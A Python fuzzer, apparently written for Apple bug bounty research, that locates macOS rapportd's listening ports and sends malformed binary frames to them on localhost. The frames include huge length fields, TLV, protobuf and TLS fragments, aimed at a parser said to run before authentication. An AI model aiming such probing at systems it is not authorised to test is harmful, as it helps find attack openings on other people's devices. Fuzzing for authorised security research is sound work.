#!/usr/bin/env python3
"""
RPNWFramer direct TCP fuzzer for rapportd.
Targets rapportd's incoming TCP connection handler (handleConnectionData:)
which runs BEFORE identity/auth verification.

Attack model: rapportd listens on a TCP port for iPhone connections.
Any device on local network can connect. The RPNWFramer binary protocol
parser runs before the device is authenticated/recognized.

Apple Bug Bounty research - authorized testing only.
"""
import socket
import struct
import time
import subprocess
import sys
import os

def get_rapportd_ports():
    """Find ports rapportd is listening on"""
    ports = []
    try:
        pid = subprocess.check_output(['pgrep', 'rapportd'], text=True).strip().split()[0]
        # lsof -p PID -i -n -P shows network files
        out = subprocess.check_output(
            ['lsof', '-p', pid, '-i', '-n', '-P'],
            text=True, stderr=subprocess.DEVNULL
        )
        print("=== rapportd network sockets ===")
        print(out)
        for line in out.splitlines():
            if 'LISTEN' in line:
                # Extract port from "TCP *:PORT (LISTEN)" or "TCP 0.0.0.0:PORT"
                parts = line.split()
                for p in parts:
                    if ':' in p:
                        try:
                            port = int(p.split(':')[-1])
                            if 1024 <= port <= 65535:
                                ports.append(port)
                        except ValueError:
                            pass
    except Exception as e:
        print("Error finding ports: %s" % e)
    return ports

def send_and_recv(sock, data, label):
    try:
        sock.sendall(data)
        sock.settimeout(2.0)
        resp = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        print("  [%s] sent %d bytes, recv %d bytes" % (label, len(data), len(resp)))
        if resp:
            print("  RESPONSE (hex):", resp[:64].hex())
        return resp
    except Exception as e:
        print("  [%s] ERROR: %s" % (label, e))
        return None

def fuzz_port(host, port):
    """Try various binary protocol frames against a rapportd TCP port"""
    print("\n=== Fuzzing %s:%d ===" % (host, port))

    # Test payloads targeting likely frame formats
    # RPNWFramer likely uses: [magic(4)] [type(2)] [length(4)] [payload]
    # or: [length(4)] [type(4)] [payload]
    payloads = [
        ("empty", b''),
        ("single null", b'\x00'),
        ("4-byte zeros", b'\x00' * 4),
        ("8-byte zeros", b'\x00' * 8),
        ("16-byte zeros", b'\x00' * 16),
        # Apple binary plist magic
        ("bplist magic", b'bplist00'),
        # Try common Apple framing patterns
        # PairSetup / Pair-Verify framing (HomeKit-like)
        ("PairSetup-like", bytes([0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])),
        # Large frame length (potential heap allocation trigger)
        ("huge frame len", bytes([0xff, 0xff, 0xff, 0xff] + [0x00]*8)),
        ("4gb-1 frame", bytes([0xff, 0xff, 0xff, 0xfe] + [0x00]*8)),
        # Type field overflow
        ("max type field", bytes([0x00, 0x00, 0x00, 0x04, 0xff, 0xff, 0x00, 0x00])),
        # Realistic small frame: magic 0x52504E57 = "RPNW" + length + type
        ("RPNW magic", b'RPNW' + struct.pack('>I', 0) + struct.pack('>H', 1)),
        # Try TLV format: tag=1, length=0
        ("TLV tag1 len0", struct.pack('>HH', 1, 0)),
        # Negative/huge length in TLV
        ("TLV huge len", struct.pack('>HI', 1, 0xffffffff)),
        # Protobuf varint (type 1, wire type 0 = varint)
        ("proto varint", bytes([0x08, 0x01])),
        # Protobuf length-delimited (type 1, wire type 2, len 256)
        ("proto len256", bytes([0x0a, 0x80, 0x02] + [0x41]*256)),
        # HTTP/1.1 header (to see if there's an HTTP mode)
        ("HTTP GET", b'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n'),
        # TLS ClientHello (abbreviated)
        ("TLS hello", bytes([0x16, 0x03, 0x01, 0x00, 0x2f, 0x01, 0x00, 0x00,
                              0x2b, 0x03, 0x03] + [0xAA]*32)),
    ]

    for label, payload in payloads:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            result = sock.connect_ex((host, port))
            if result == 0:
                resp = send_and_recv(sock, payload, label)
                # Check if connection stayed open (protocol state machine)
                if resp is not None and len(resp) == 0:
                    # Try a follow-up send to see if server closed after bad data
                    try:
                        sock.sendall(b'\x00' * 4)
                        r2 = sock.recv(4)
                        if r2:
                            print("    Follow-up response:", r2.hex())
                    except:
                        print("    Connection closed by server after payload")
            else:
                print("  [%s] connect failed: errno=%d" % (label, result))
            sock.close()
        except Exception as e:
            print("  [%s] exception: %s" % (label, e))
        time.sleep(0.3)

def main():
    print("=== RPNWFramer TCP Framing Fuzzer ===", flush=True)

    # Step 1: Find rapportd's listening ports
    ports = get_rapportd_ports()
    print("\nListening ports found: %s" % ports, flush=True)

    if not ports:
        print("\nNo listening ports found via lsof. Trying netstat...", flush=True)
        try:
            out = subprocess.check_output(['netstat', '-an'], text=True)
            pid_out = subprocess.check_output(['pgrep', 'rapportd'], text=True).strip()
            print("rapportd PIDs: %s" % pid_out, flush=True)
            # Print all LISTEN lines for analysis
            listen_lines = [l for l in out.splitlines() if 'LISTEN' in l]
            for l in listen_lines[:50]:
                print(l, flush=True)
        except Exception as e:
            print("netstat error: %s" % e, flush=True)

    # Step 2: Also check for Unix domain sockets rapportd listens on
    print("\n=== rapportd Unix sockets ===", flush=True)
    try:
        pid = subprocess.check_output(['pgrep', 'rapportd'], text=True).strip().split()[0]
        out = subprocess.check_output(
            ['lsof', '-p', pid, '-U', '-n'],
            text=True, stderr=subprocess.DEVNULL
        )
        print(out or "(none)")
    except Exception as e:
        print("Unix socket check error: %s" % e)

    # Step 3: Fuzz any listening ports we found
    if ports:
        for port in set(ports):
            fuzz_port('127.0.0.1', port)
            fuzz_port('::1', port)
    else:
        # Try common Apple Continuity ports
        common_ports = [49152, 49153, 49154, 49155, 62078, 7000, 7100, 9999]
        print("\nTrying common Apple continuity ports:", common_ports, flush=True)
        for port in common_ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex(('127.0.0.1', port))
            s.close()
            if result == 0:
                print("  Port %d: OPEN" % port, flush=True)
                fuzz_port('127.0.0.1', port)

    print("\n=== Fuzzing complete ===", flush=True)

if __name__ == '__main__':
    main()
